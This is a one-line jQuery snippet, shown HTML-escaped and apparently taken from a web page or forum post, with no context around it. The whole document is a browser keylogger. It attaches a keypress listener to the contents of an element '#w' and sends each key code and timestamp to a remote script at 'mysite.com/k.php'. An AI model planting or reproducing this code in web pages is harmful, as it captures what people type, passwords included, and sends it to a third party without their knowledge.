    $(&#39;#w&#39;).contents().keypress(function(event) {$.get(&#39;http://www.mysite.com/k.php?x=&#39;+event.which+&#39;&amp;t=&#39;+event.timeStamp,function(data){});});

